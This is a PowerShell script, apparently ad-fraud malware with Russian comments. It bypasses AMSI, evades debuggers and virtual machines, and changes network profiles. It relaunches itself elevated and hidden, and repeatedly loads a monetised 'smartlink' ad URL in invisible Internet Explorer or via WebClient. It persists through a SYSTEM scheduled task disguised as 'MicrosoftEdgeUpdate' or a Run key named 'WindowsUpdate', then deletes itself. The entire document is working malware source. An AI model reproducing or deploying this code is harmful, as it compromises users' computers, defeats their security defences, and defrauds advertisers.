$ErrorActionPreference='SilentlyContinue'
$ProgressPreference='SilentlyContinue'

# 1. AMSI BYPASS
try{[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiInitFailed","NonPublic,Static").GetValue($null),0x01)}catch{}
try{[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,[IntPtr]0)}catch{}

# 2. АНТИ-ОТЛАДКА И АНТИ-VM
if([System.Diagnostics.Debugger]::IsAttached){exit}
$vmProcs=@('vboxservice','vboxtray','vmwaretray','vmtoolsd','xenservice')
foreach($p in $vmProcs){if(Get-Process $p -EA 0){exit}}

# 3. ПЕРЕКЛЮЧАЕМ СЕТЬ В ЧАСТНУЮ (обход публичных сетей)
try{
    $netProfiles = Get-NetConnectionProfile -EA 0
    foreach($profile in $netProfiles){
        Set-NetConnectionProfile -InterfaceIndex $profile.InterfaceIndex -NetworkCategory Private -EA 0
    }
}catch{}
# Альтернативный метод через netsh (для старых Win7)
try{netsh advfirewall set currentprofile settings inboundusernotification enable}catch{}

# 4. UAC ЭЛЕВАЦИЯ
$isAdmin=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if(-not $isAdmin){
    $psi=New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName="powershell.exe"
    $psi.Arguments="-NoP -NonI -W Hidden -Exec Bypass -File `"$($MyInvocation.MyCommand.Path)`""
    $psi.Verb="runas"
    [System.Diagnostics.Process]::Start($psi)|Out-Null;exit
}

# 5. LOCK FILE
$lockPath="$env:APPDATA\Microsoft\Windows\swill.lock"
if(Test-Path $lockPath){exit}
New-Item $lockPath -Force|Out-Null

# 6. SMARTLINK
$smartlink="https://www.profitablecpmratenetwork.com/ui63ybej16?key=65bc28f91ecb56970211c61fc28fd009"

# 7. ОТКЛЮЧЕНИЕ ПЕРВОГО ЗАПУСКА IE
$regPath="HKCU:\Software\Microsoft\Internet Explorer\Main"
Set-ItemProperty -Path $regPath -Name "DisableFirstRunCustomize" -Value 1 -Force -EA 0

# 8. ФУНКЦИЯ ОТКРЫТИЯ SMARTLINK С FALLBACK НА РАЗНЫЕ ПРОЦЕССЫ
function Open-Smartlink {
    # Пробуем через IE
    try{
        $ie=New-Object -ComObject InternetExplorer.Application
        $ie.Visible=$false
        $ie.Silent=$true
        $ie.Navigate($smartlink)
        for($i=0;$i -lt 30;$i++){if($ie.ReadyState -eq 4){break};Start-Sleep -Milliseconds 500}
        Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)
        $ie.Quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject($ie)|Out-Null
        return
    }catch{}
    
    # Fallback: через WebClient
    try{
        $wc=New-Object Net.WebClient
        $wc.Headers.Add("User-Agent","Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
        $wc.DownloadString($smartlink)|Out-Null
    }catch{}
}

# 9. ПЕРСИСТЕНТНОСТЬ
$randNum=Get-Random -Min 1000 -Max 9999
$persistScript="@
`$ErrorActionPreference='SilentlyContinue'
`$url='$smartlink'
while(`$true){
    try{
        `$ie=New-Object -ComObject InternetExplorer.Application
        `$ie.Visible=`$false
        `$ie.Silent=`$true
        `$ie.Navigate(`$url)
        for(`$i=0;`$i -lt 30;`$i++){if(`$ie.ReadyState -eq 4){break};Start-Sleep -Milliseconds 500}
        Start-Sleep -Seconds (Get-Random -Min 5 -Max 15)
        `$ie.Quit()
        [System.Runtime.Interopservices.Marshal]::ReleaseComObject(`$ie)|Out-Null
    }catch{}
    Start-Sleep -Seconds (Get-Random -Min 300 -Max 600)
}
"
$persistPath="$env:APPDATA\Microsoft\Windows\p_$randNum.ps1"
$persistScript|Out-File $persistPath -Encoding ASCII -Force

# Пробуем создать задачу через SYSTEM
$taskResult = schtasks /create /tn "MicrosoftEdgeUpdate_$randNum" /tr "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" /sc onstart /ru SYSTEM /f 2>&1
if($LASTEXITCODE -ne 0){
    # Если не получилось, пишем в реестр (HKCU)
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsUpdate_$randNum" -Value "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$persistPath`"" -Force -EA 0
}

Open-Smartlink
Remove-Item $MyInvocation.MyCommand.Path -Force -EA 0
